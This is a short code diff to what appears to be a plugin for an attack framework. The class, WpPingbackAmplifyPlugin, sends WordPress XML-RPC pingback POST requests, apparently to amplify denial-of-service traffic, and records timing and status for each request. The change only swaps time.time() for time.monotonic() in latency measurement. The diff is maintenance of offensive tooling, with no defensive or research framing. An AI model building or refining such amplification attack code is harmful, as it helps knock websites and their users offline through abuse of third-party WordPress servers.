@@ -120,13 +120,13 @@ class WpPingbackAmplifyPlugin(AttackPlugin):
                 headers = self._get_fresh_headers(context, "document")
                 headers["Content-Type"] = "text/xml"
 
-                t = time.time()
+                t = time.monotonic()
                 try:
                     async with context.session.post(
                         url, headers=headers, data=xml_body,
                         ssl=_ssl, allow_redirects=False,
                     ) as resp:
-                        rt = time.time() - t
+                        rt = time.monotonic() - t
                         ok = resp.status < 500
                         await self._record(
                             "WP-PING", ok, resp.status, rt,
@@ -136,7 +136,7 @@ class WpPingbackAmplifyPlugin(AttackPlugin):
                 except asyncio.CancelledError:
                     raise
                 except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
-                    rt = time.time() - t
+                    rt = time.monotonic() - t
                     await self._record(
                         "WP-PING", False, 0, rt,
                         err=type(exc).__name__,
